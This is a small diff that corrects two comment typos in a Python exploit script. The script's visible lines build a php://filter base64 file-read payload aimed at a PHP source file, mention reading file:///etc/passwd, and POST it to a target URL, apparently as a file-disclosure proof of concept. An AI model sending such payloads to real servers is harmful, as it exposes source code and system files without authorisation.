@@ -3,7 +3,7 @@
 import requests
 import base64
 
-# File can be also for exmample "file:///etc/passwd"
+# File can be also for example "file:///etc/passwd"
 # PHP:// can expose server side source code
 FILE = 'php://filter/convert.base64-encode/resource=tracker_diRbPr00f314.php'
 
@@ -27,7 +27,7 @@ POST_DATA = {'data': dataStr}
 req = requests.post(
     TARGET_URL,
     data=POST_DATA,
-    headers={  # This maybe unnecesary
+    headers={  # This maybe unnecessary
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Request-With": "XMLHttpRequest"
     },
